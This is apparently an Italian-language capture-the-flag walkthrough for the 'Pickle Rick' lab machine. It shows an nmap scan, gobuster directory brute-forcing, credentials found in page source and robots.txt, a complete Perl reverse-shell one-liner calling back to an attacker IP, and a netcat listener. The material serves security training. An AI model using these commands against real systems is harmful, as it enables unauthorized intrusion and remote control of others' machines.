#  Pickle Rick

_________________

#  Task 1 - Pickle Rick

- sudo nmap -p- --open -sC -sV -sS -A -T 5 -Pn -oN scan_pickle.txt TARGET-IP

![Istantanea_2023-08-05_17-20-30](https://github.com/Manganaccio/Manganaccio/assets/137283468/b0671aa8-bd4a-4af2-9a30-91cf0f6c35ad)

- essendo aperta la porta 80 si può visitare la pagina web, una volta visitata esaminare il codice sorgente della stessa, viene fornita un username, manca a questo punto una password ed una pagina di login

![Istantanea_2023-08-05_17-19-18](https://github.com/Manganaccio/Manganaccio/assets/137283468/259037d1-74af-4e30-a989-0410973aed80)

- usare gobuster per trovare le directories nascoste e aggiungendo il comando _-x php_ in modo da trovare eventuali pagine di login: gobuster dir -u http://TARGET-IP -w /usr/share/wordlists/dirb/common.txt  -x php

![Istantanea_2023-08-06_09-07-38](https://github.com/Manganaccio/Manganaccio/assets/137283468/8486d2e6-e4e6-4424-82a2-10af685be615)

- visitando la pagina robots.txt si può ottenere una parola che presumibilmente sarà la password dell'username trovato in precedenza

 ![Istantanea_2023-08-05_17-21-44](https://github.com/Manganaccio/Manganaccio/assets/137283468/c2bbae57-8946-44ad-93c0-74a3f1ac815f)

- visitando la pgina login.php si potrà effettuare l'accesso con le credenziali trovate. Si verrà poi indirizzati ad una nuova pagina web dove si potrà eseguire il comando per ottenere la reverse shell:
  perl -e 'use Socket;$i="YOUR-IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
- in un terminale eseguire il comando: nc -lvnp PORT (la porta da selezionare dovrà essere la medesima inserita nel comando "perl")

![Istantanea_2023-08-06_09-36-42](https://github.com/Manganaccio/Manganaccio/assets/137283468/74752716-7fb8-40b7-ad59-877b42e927dd)

